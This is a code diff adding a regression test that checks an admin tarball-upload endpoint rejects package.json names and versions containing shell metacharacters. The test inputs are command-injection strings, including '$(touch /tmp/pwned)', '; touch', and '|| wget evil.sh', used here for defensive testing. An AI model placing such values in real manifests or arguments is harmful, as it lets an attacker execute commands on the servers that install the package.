@@ -28,7 +28,7 @@ const enginePkg = { name: "@test/uploaded-engine", version: "4.5.6" };
 let engineTarball: Buffer;
 const engineHash = () => createHash("sha256").update(engineTarball).digest("hex").slice(0, 16);
 
-function makeEngineTarball(): Buffer {
+function makeEngineTarball(pkg: { name: string; version: string } = enginePkg): Buffer {
 	// A real `npm pack` tarball: gzip, single package/ root with a package.json.
 	const dir = fs.mkdtempSync(path.join(os.tmpdir(), "bgs-upload-spec-"));
 	try {
@@ -36,11 +36,27 @@ function makeEngineTarball(): Buffer {
 		fs.mkdirSync(path.join(pkgDir, "dist"), { recursive: true });
 		fs.writeFileSync(
 			path.join(pkgDir, "package.json"),
-			JSON.stringify({ ...enginePkg, type: "module", main: "dist/engine.mjs" }),
+			JSON.stringify({ ...pkg, type: "module", main: "dist/engine.mjs" }),
 		);
 		fs.writeFileSync(path.join(pkgDir, "dist", "engine.mjs"), "export {};\n");
 		execFileSync("npm", ["pack", "--pack-destination", dir], { cwd: pkgDir, stdio: "pipe" });
-		return fs.readFileSync(path.join(dir, `test-uploaded-engine-${enginePkg.version}.tgz`));
+		return fs.readFileSync(path.join(dir, `test-uploaded-engine-${pkg.version}.tgz`));
+	} finally {
+		fs.rmSync(dir, { recursive: true, force: true });
+	}
+}
+
+// npm refuses to pack a manifest whose name/version violate its grammar, so a
+// hostile tarball is hand-built with tar(1) — same package/ layout npm packs.
+function makeRawEngineTarball(pkg: { name: string; version: string }): Buffer {
+	const dir = fs.mkdtempSync(path.join(os.tmpdir(), "bgs-upload-spec-raw-"));
+	try {
+		const pkgDir = path.join(dir, "package");
+		fs.mkdirSync(pkgDir, { recursive: true });
+		fs.writeFileSync(path.join(pkgDir, "package.json"), JSON.stringify({ ...pkg, type: "module" }));
+		const out = path.join(dir, "engine.tgz");
+		execFileSync("tar", ["-czf", out, "-C", dir, "package"], { stdio: "pipe" });
+		return fs.readFileSync(out);
 	} finally {
 		fs.rmSync(dir, { recursive: true, force: true });
 	}
@@ -200,6 +216,31 @@ describe("Admin gameinfo bundle uploads (#268)", () => {
 			// Persisted on the game doc (the game-server installer reads it from there).
 			const saved = await colls.gameInfos.findOne({ _id: { game: GAME, version: VERSION } });
 			assert.strictEqual(saved?.engine?.package.url, doc.engine?.package.url);
+		});
+
+		it("rejects a tarball whose package.json name/version violate the npm grammar (#270)", async () => {
+			const before_ = await colls.gameInfos.findOne({ _id: { game: GAME, version: VERSION } });
+			const objectsBefore = bucketObjects(s3Mock).size;
+
+			// Shell metacharacters in the tarball's package.json must never reach
+			// engine.package — the game-server installer builds npm argv from it.
+			for (const pkg of [
+				{ name: "x$(touch /tmp/pwned)", version: "1.0.0" },
+				{ name: "a;touch /tmp/pwned", version: "1.0.0" },
+				{ name: "@test/uploaded-engine", version: "1.0.0 || wget evil.sh" },
+			]) {
+				const res = await api(
+					"POST",
+					`/api/admin/gameinfo/${GAME}/${VERSION}/engine`,
+					adminHeaders,
+					makeRawEngineTarball(pkg),
+				);
+				assert.strictEqual(res.status, 400, `expected 400 for ${JSON.stringify(pkg)}`);
+			}
+
+			const after_ = await colls.gameInfos.findOne({ _id: { game: GAME, version: VERSION } });
+			assert.deepStrictEqual(after_?.engine, before_?.engine, "doc untouched");
+			assert.strictEqual(bucketObjects(s3Mock).size, objectsBefore, "no tarball stored in S3");
 		});
 
 		it("rejects a non-tarball engine upload without touching the doc", async () => {
